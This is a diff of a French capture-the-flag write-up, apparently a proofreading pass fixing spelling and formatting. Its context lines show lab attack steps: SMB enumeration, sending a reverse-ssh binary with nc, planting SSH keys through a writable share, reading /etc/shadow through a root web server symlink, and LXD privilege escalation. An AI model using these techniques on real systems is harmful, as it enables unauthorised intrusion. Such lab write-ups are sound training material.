@@ -82,7 +82,7 @@ $ smbclient -U "" -N -L //192.168.101.128
 SMB1 disabled -- no workgroup available
 ```
 
-Une tentative d'accès au partage $print renvoie une erreur NT\_STATUS\_ACCESS\_DENIED mais le disque *welcome* est (évidemment) plus accueillant :  
+Une tentative d'accès au partage `$print` renvoie une erreur `NT_STATUS_ACCESS_DENIED` mais le disque *welcome* est (évidemment) plus accueillant :  
 
 ```
 smb: \> ls
@@ -279,7 +279,7 @@ Le trafic entrant n'a pas ce type de restrictions alors il suffit de mettre en p
 $ nc -l -p 9999 > /tmp/reverse-sshx64
 ```
 
-et on envoi la sauce :  
+et on envoie la sauce :  
 
 ```bash
 $ ncat 192.168.101.128 9999 -v < /tmp/reverse-sshx64
@@ -290,9 +290,9 @@ Il ne reste plus qu'à se connecter avec SSH sur le port 31337 et le password pa
 This is the way
 ---------------
 
-Mais la façon attendue d'obtenir le shell c'est visiblement de profiter que le partage SMB est en écriture.  
+Mais la façon attendue d'obtenir le shell, c'est visiblement de profiter que le partage SMB est en écriture.  
 
-Il ne faudra pas longtemps pour créer le dossier *.ssh* et y déposer un fichier *authorized\_keys*.  
+Il ne faudra pas longtemps pour créer le dossier `.ssh` et y déposer un fichier `authorized_keys`.  
 
 Une particularité sur ce CTF est que selon le chemin employé (via le webshell ou via SMB) le dossier */tmp* contient un contenu différent. Vraisemblablement une réglage de systemd que j'ai déjà croisé par le passé.  
 
@@ -304,7 +304,7 @@ uid=1000(jarves) gid=1000(jarves) groups=1000(jarves),4(adm),24(cdrom),27(sudo),
 
 On ne dispose pas du mot de passe de l'utilisateur et ce dernier n'est pas présent dans la base MySQL locale ou ailleurs sur le système.  
 
-*LinPEAS* indique que le système est peut être vulnérable à la faille sudo *Baron Samedit* mais l'exploit me dit explicitement que la version est patchée.  
+*LinPEAS* indique que le système est peut-être vulnérable à la faille sudo *Baron Samedit* mais l'exploit me dit explicitement que la version est patchée.  
 
 On remarque que certains process sont lancés via le démon CRON :  
 
@@ -325,9 +325,9 @@ Détail amusant, le serveur web de Python est exécuté en root et livre un doss
 $ ln -s / disk
 ```
 
-Et effectivement c'est le cas !  
+Et effectivement, c'est le cas !  
 
-Je peux par exemple lire la contab de root à l'adresse *http://192.168.101.128:10123/disk/var/spool/cron/crontabs/root* :  
+Je peux par exemple lire la contab de root à l'adresse `http://192.168.101.128:10123/disk/var/spool/cron/crontabs/root` :  
 
 ```
 # m h  dom mon dow   command
@@ -336,7 +336,7 @@ Je peux par exemple lire la contab de root à l'adresse *http://192.168.101.128:
 *1/ *   * * *   bash /root/service
 ```
 
-J'ai aussi accès au contenu du fichir */etc/shadow* :  
+J'ai aussi accès au contenu du fichier `/etc/shadow` :  
 
 ```
 jarves:$6$bh9b6tMU.UIAzSq6$m6KFceXgSBAI/lnyIXVJK3t.5MnTRbU8zna08doU0OED53FgvXLo6vIzovX2TdXHPMPMAMtUFIZKAuriKfWCo1:18755:0:99999:7:::
@@ -344,7 +344,7 @@ jarves:$6$bh9b6tMU.UIAzSq6$m6KFceXgSBAI/lnyIXVJK3t.5MnTRbU8zna08doU0OED53FgvXLo6
 
 Malheureusement il a l'air assez solide.  
 
-Il ne reste qu'à procéder à une escalade de provilège par LXC. Je me suis inspiré [d'un article](https://www.hackingarticles.in/lxd-privilege-escalation/) mais en évitant l'étape où l'on doit faire exécuter un script en root sur sa machine personnelle.  
+Il ne reste qu'à procéder à une escalade de privilège par LXC. Je me suis inspiré [d'un article,](https://www.hackingarticles.in/lxd-privilege-escalation/) mais en évitant l'étape où l'on doit faire exécuter un script en root sur sa machine personnelle.  
 
 Le principe est similaire à une escalade via Docker : on va créer un container sur lequel on monte le disque hôte. On en profite pour placer notre clé publique SSH comme clé autorisée pour root :  
 
